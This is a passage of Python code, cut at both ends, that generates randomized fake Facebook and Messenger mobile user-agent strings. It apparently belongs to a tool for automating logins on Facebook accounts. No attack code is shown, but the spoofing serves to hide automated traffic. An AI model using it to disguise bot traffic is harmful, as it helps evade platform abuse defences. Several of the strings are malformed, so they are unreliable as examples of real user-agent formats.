    iphone3 = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/158.0.0.44.98;FBBV/90997758;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/en_US;FBOP/5;FBRV/90997758]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/672970693;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/674179525;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H350 [FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/696635672;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/700448384;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D82 [FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/707243085;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/704769221;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/708017881;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBIOS;FBAV/151.0.0.61.202;FBBV/82156572;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/SFR;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/83160404]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/534883268;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_Qaau_IT;FBOP/5;FBRV/537932531]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H364 [FBAN/FBIOS;FBAV/441.1.0.27.105;FBBV/539464914;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/541069100]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/276.0.0.32.107;FBBV/235827610;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/469153370;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/471145542]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/627850395;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/630494309;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/FBIOS;FBAV/174.0.0.48.98;FBBV/110921384;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/3;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/112241032]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/159.0.0.48.97;FBBV/91994325;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/92489346]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 [FBAN/FBIOS;FBAV/155.0.0.36.93;FBBV/87992437;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.1.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/89136215]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBIOS;FBAV/182.0.0.42.80;FBBV/118457561;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/POST;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/119485025]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/165.0.0.74.96;FBBV/100174821;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/100948865]'])
    ___ERROR_ON_FIRE___ = '' + str(iphone3) + ' ' + str(agent3)
    return ___ERROR_ON_FIRE___

def ____ua1x____():
    fb_version = f'{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}'
    fb_version_code = str(random.randint(10000000, 66666666))
    density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
    width = random.randint(720, 1440)
    height = random.randint(1080, 2560)
    fbrv = str(random.randint(0, 999999999))
    sim_name = random.choice(['Telenor', 'fido', 'MOVO AFRICA', 'UFONE-PAKTel', 'Zong', 'Jazz', 'SCO', 'Jio', 'Vodafone', 'Airtel', 'BSNL', 'MTNL', 'Grameenphone', 'Robi', 'Banglalink', 'Teletalk', 'Telkomsel', 'Indosat Ooredoo', 'Axiata', 'Tri', 'Smartfren', 'China Mobile', 'Unicom', 'Telecom', 'Satcom', 'Docomo', 'Rakuten', 'IIJmio', 'Orange', 'Verizon', 'AT&T', 'T-Mobile', 'Sprint', 'Vodafone', 'Telefonica', 'EE', 'Orange', 'Three'])
    county_code = random.choice(['en_US', 'en_GB'])
    android_version = f'{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}'
    android_model = random.choice(['SM-G920F', 'SM-T535', 'SM-T231', 'SM-J320F', 'GT-I9190', 'GT-N7100', 'SM-T561', 'GT-N7100', 'GT-I9500', 'SM-J320F', 'SM-G930F', 'SM-J320F', 'SM-J510FN', 'GT-P5100', 'SM-J320F', 'SM-T531', 'SPH-L720', 'GT-I9500'])
    user_agent1 = f'[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/' + '{density=' + density + ',width=' + str(width) + ',height=' + str(height) + '}' + f';FBLC/{county_code};FBCR/{sim_name};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    user_agent2 = f'[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/' + '{density=' + density + ',width=' + str(width) + ',height=' + str(height) + '}' + f';FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:;]'
    return random.choice([user_agent1, user_agent2])

def ____u1a____():
    model = random.choice(['CPH2071', 'CPH2209'])
    ua1 = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/' + '{density=2.25,width=720,height=1280}' + f';FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua2 = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/' + '{density=2.25,width=720,height=1280}' + f';FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua3 = '[FBAN/FB4A;FBAV/' + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(4000, 5000)) + ';FBBV/' + str(random.randint(4000000, 5000000)) + f';[FBAN/Orca-Android;FBAV/139.0.0.17.85;[FBAN/Orca-Android;FBAV/346.0.0.7.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/348143439;FBCR/HOME;FBMF/LGE;FBBD/lge;FBDV/{model};FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/' + '{density=1.75,width=720,height=1356}' + ';FB_FW/1;]'
    ua4 = '[FBAN/Orca-Android;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/' + '{density=2.25,width=720,height=1280}' + f';FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua5 = '[FBAN/Orca-Android;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/' + '{density=2.25,width=720,height=1280}' + f';FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua6 = '[FBAN/Orca-Android;FBAV/' + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(4000, 5000)) + ';FBBV/' + str(random.randint(4000000, 5000000)) + f';[FBAN/Orca-Android;FBAV/139.0.0.17.85;[FBAN/Orca-Android;FBAV/346.0.0.7.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/348143439;FBCR/HOME;FBMF/LGE;FBBD/lge;FBDV/{model};FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/' + '{density=1.75,width=720,height=1356}' + ';FB_FW/1;]'
    return random.choice([ua1, ua2, ua3, ua4, ua5, ua6])

def warlee():
    and_ver = str(random.randrange(9, 12))
    app_ver = str(random.randint(111, 999)) + '.0.0.' + str(random.randrange(9, 99)) + '.' + str(random.randint(111, 333))
    app_ver1 = str(random.randint(111, 999)) + '.0.0.' + str(random.randrange(9, 99)) + '.' + str(random.randint(111, 333))
    app_ver_code = str(random.randint(111111111, 999999999))
    app_ver_code1 = str(random.randint(111111111, 999999999))
    CPH2387 = random.choice(['CPH2411', 'CPH2423', 'CPH2413', 'CPH2415', 'CPH2417', 'CPH2419', 'CPH2447', 'CPH2449', 'CPH2451', 'CPH2399', 'CPH2401', 'CPH2381', 'CPH2409', 'CPH2459', 'CPH2477', 'CPH2471', 'CPH1923', 'CPH1837', 'CPH1803', 'CPH1853', 'CPH2133', 'CPH2139', 'CPH2135', 'CPH2303', 'CPH2387', 'CPH2407', 'CPH2385', 'CPH1901', 'CPH1905', 'CPH2067', 'CPH2219', 'CPH2339', 'CPH2483', 'CPH2495', 'CPH1937', 'CPH1941', 'CPH2059', 'CPH2121', 'CPH2123', 'CPH2203', 'CPH1920', 'CPH1903', 'CPH1705fw', 'CPH1605', 'OPPO CPH1605', 'CPH1605fw', 'CPH1609', 'CPH1609fw', 'CPH1613', 'CPH1613fw', 'CPH1701'])
    Infinix_X606D = random.choice(['Infinix_X689F', 'Infinix_X682B', 'Infinix_X682C', 'Infinix_X657B', 'Infinix_X688B', 'Infinix_X688C', 'Infinix_X657B', 'Infinix_X658B', 'Infinix_X658E', 'Infinix_X659', 'Infinix_X659B', 'Infinix_X662', 'Infinix_X662B', 'Infinix_X675', 'Infinix_X6812', 'Infinix_X665', 'Infinix_X665B', 'Infinix_X510', 'Infinix_X6827', 'Infinix_X665C', 'Infinix_X665E', 'Infinix_HOT 3 Pro', 'Infinix-X554', 'Infinix_HOT 3 LTE', 'Infinix_HOT 4', 'Infinix_HOT4 LTE', 'Infinix_X557', 'Infinix_HOT 4 Lite', 'Infinix_HOT 4 Pro', 'Infinix_X556_LTE', 'Infinix_X606', 'Infinix_X606B', 'Infinix_X606C', 'Infinix_X606D', 'Infinix_X608', 'Infinix_X624', 'Infinix_X624B', 'Infinix_X625B', 'Infinix_X625D', 'Infinix_X650B', 'Infinix_X650C', 'Infinix_X650D', 'Infinix_X650', 'Infinix-X551', 'Infinix_X573', 'Infinix_X573S', 'Infinix_X573B', 'Infinix_X622', 'Infinix_X559C'])
    sim = random.choice(['Verizon', 'T-Mobile', 'Visible', 'US Mobile', 'Mint Mobile', 'Boost Mobile', 'Xfinity'])
    sim1 = random.choice(['Verizon', 'T-Mobile', 'Visible', 'US Mobile', 'Mint Mobile', 'Boost Mobile', 'Xfinity'])
    density = random.choice(['1.5', '2.0', '3.0'])
    width = random.choice(['540', '720', '1080'])
    height = str(random.randrange(999, 2480))
    density1 = random.choice(['1.5', '2.0', '3.0'])
    width1 = random.choice(['540', '720', '1080'])
    height1 = str(random.randrange(999, 2480))
    user_agent = '[FBAN/FB4A;FBAV/' + str(app_ver) + ';FBBV/' + str(app_ver_code) + ';FBDM/' + '{density=' + str(density) + ',width=' + str(width) + ',height=' + str(height) + '};FBLC/en_US;FBCR/' + str(sim) + ';FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/' + str(CPH2387) + ';FBSV/' + str(and_ver) + ';FBOP/1;FBCA/armeabi-v7a:armeabi;]\',\'[FB4A/;FBAV/YZWSES93;FBBV/342657617;FBAN/FB4A;FBAV/YZWSES93;FBBV/342657617;FBDM//*{density=3.0,width=1080,height=2560};FBLC/ja_JP;FBRV/554638314;FBCR/TECNO;FBMF/Xiaomi;FBBD/Megagate;FBPN/com.facebook.katana;FBDV/Motorola_Moto_G200;FBSV/16;FBOP/6;FBCA/armeabi;]'
    user_agents.append(f'\"{user_agent}\"')
    return user_agent
def userag2():
    fb_v1 = str(random.choice(range(111, 555)))
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 433333333)))
    rdp2 = str(random.choice(range(111111111, 433333333)))
    andv = str(random.choice(range(8, 12)))
    ua = 'Dalvik/2.1.0 (Linux; U; Android ' + andv + '.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/' + fb_v1 + '.0.0.16.' + fb_v2 + ';FBPN/com.facebook.orca;FBLC/en_US;FBBV/' + rdp1 + ';FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/' + andv + '.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920}'
    return ua

def fuckx():
    model = random.choice(['SM-J200H', 'SM-J320H', 'SM-J400F', 'SM-J510H', 'SM-G570F', 'SM-J600FN', 'SM-J710F', 'SM-J730F', 'SM-J810M', 'SM-N950X', 'SM-A013F', 'SM-A500M', 'SM-A515F'])
    ufff = '[FBAN/FB4A;FBAV/451.0.0.45.109;FBBV/449217850;[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920}' + f';FBLC/en_US;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    return ufff

def __fuck1__():
    model = random.choice(['CPH1931', 'CPH1803', 'CPH1909', 'CPH1901', 'PDBM00', 'CPH2083'])
    ufff = '[FBAN/FB4A;FBAV/' + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(4000, 5000)) + ';FBBV/' + str(random.randint(4000000, 5000000)) + ';[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/' + '{density=2.0,width=720,height=1456}' + f';FBLC/en_US;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/{model};FBSV/8.1.0;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
    return ufff

def __fuck2__():
    model = random.choice(['RMX2185', 'RMX2189', 'RMX2180', 'RMX2101', 'RMX3063', 'RMX3201', 'RMX3193', 'RMX2151', 'RMX3085', 'RMX2193'])
    ufff = f'[FBAN/FB4A;FBAV/' + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(4000, 5000)) + ';FBBV/' + str(random.randint(4000000, 5000000)) + ';[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/' + '{density=2.25,width=720,height=1400}' + f';FBLC/en_Qaau_US;FBRV/369757394;FBCR/Grameenphone;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/{model};FBSV/7.1.1;FBOP/1;FBCA/arm64-v8a:;]'
    return ufff

def generate_realistic_ua():
    brands = ['Redmi Note', 'Vivo', 'Samsung', 'Realme', 'OnePlus']
    brand = random.choice(brands)
    ver = f'{random.randint(200, 350)}.0.0.{random.randint(0, 99)}.{random.randint(0, 99)}'
    build = f'QKQ1.{random.randint(111111, 999999)}'
    android = random.randint(6, 13)
    model = f'{brand} {random.randint(4, 12)} Pro'
    return f'Dalvik/2.1.0 (Linux; U; Android {android}; {model} Build/{build}) [FBAN/FB4A;FBAV/{ver};FBLC/en_US;FBBV/{random.randint(100000, 300000)};FBCR/NT;FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;FBDV/{model};FBSV/{android};FBOP/1;FBCA/armeabi-v7a:armeabi]'

def rnua():
    android_versions = ['7.0', '8.0', '8.1.0', '9', '10', '11', '12', '13', '14']
    chrome_versions = ['80.0.3987.99', '83.0.4103.106', '86.0.4240.198', '90.0.4430.91', '95.0.4638.74', '100.0.4896.127', '107.0.0.0', '110.0.5481.77', '115.0.5790.171', '120.0.6099.129', '125.0.6422.112']
    signal_versions = ['5.0.0', '6.0.0', '6.10.0', '6.20.0', '7.0.0', '7.2.0', '7.4.0']
    android_version = random.choice(android_versions)
    chrome_version = random.choice(chrome_versions)
    signal_version = random.choice(signal_versions)
    device = random.choice(['Pixel 6', 'Pixel 6a', 'Pixel 7', 'Pixel 7 Pro', 'Pixel 8', 'Pixel 8 Pro', 'Redmi Note 10 Pro', 'Samsung Galaxy S21', 'OnePlus 9', 'Nothing Phone 1'])
    ua = f'Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36 Signal/{signal_version}'
    return ua

def f4():
    poco_models = ['Poco F1', 'Poco X3 NFC', 'Poco M3', 'Poco F2 Pro', 'Poco X4 Pro', 'Poco M4 Pro']
    user_agent = f'[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)};FBDM/{{density=2.0,width=1080,height=2400}};FBLC/en_US;FBRV/{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{random.choice(poco_models)};FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a;]'
    return user_agent

def best_redmi_ua():
    redmi_best_models = [{'model': 'Redmi Note 13', 'code': '2312DRAABC', 'android': '13', 'resolution': (1080, 2400)}, {'model': 'Redmi 12', 'code': '23053RN02L', 'android': '13', 'resolution': (1080, 2460)}, {'model': 'Redmi Note 11', 'code': '2109119DG', 'android': '13', 'resolution': (1080, 2400)}]
    selected = random.choice(redmi_best_models)
    density = round(random.uniform(2.5, 3.5), 2)
    width, height = selected['resolution']
    ua = f'[FBAN/FB4A;FBAV/449.0.0.9.105;FBBV/298672707;FBDM/{{density={density},width={width},height={height}}};FBLC/bn_BD;FBRV/299927973;FBCR/Grameenphone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{selected["code"]};FBSV/{selected["android"]};FBOP/1;FBCA/arm64-v8a:;]'
    return ua

def redmiua():
    android_versions = ['7.0', '7.1.1', '8.0.0', '8.1.0', '9', '10', '11', '12', '13']
    redmi_models = ['Redmi Note 7', 'Redmi Note 7 Pro', 'Redmi Note 8', 'Redmi Note 8T', 'Redmi Note 8 Pro', 'Redmi Note 9', 'Redmi Note 9 Pro', 'Redmi Note 9S', 'Redmi Note 10', 'Redmi Note 10S', 'Redmi Note 10 Pro', 'Redmi Note 11', 'Redmi Note 11 Pro', 'Redmi Note 12', 'Redmi 7A', 'Redmi 8A', 'Redmi 9A', 'Redmi 10A']
    android_version = random.choice(android_versions)
    redmi_model = random.choice(redmi_models)
    miui_version = f'V{random.randint(10, 13)}.0.{random.randint(1, 20)}.0'
    user_agent = f'Dalvik/2.1.0 (Linux; U; Android {android_version}; {redmi_model} MIUI/{miui_version}) [FBAN/Orca-Android;FBAV/{random.randint(200, 350)}.0.0.{random.randint(10, 80)}.{random.randint(10, 300)};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{random.randint(100000000, 300000000)};FBCR/PLAY;FBMF=Xiaomi;FBBD=xiaomi;FBDV={redmi_model};FBSV={android_version};FBCA/arm64-v8a:null;FBDM/{{density=2.75,width=1080,height=2130}};FB_FW/1;] FBBK/1'
    return user_agent

def UA():
    dal = 'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))'
    a = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777))
    b = ';[FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;][FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    c = ';[FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;][FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]'
    d = ';[FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;][FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]'
    ua = a + b + c + d
    return ua

def UA1():
    dal = 'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))'
    a = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777))
    b = ';[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = a + b
    return ua

def UAA():
    dal = 'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))'
    a = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777))
    b = ';[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = a + b
    return ua

def UAA2():
    dal = 'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))'
    a = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777))
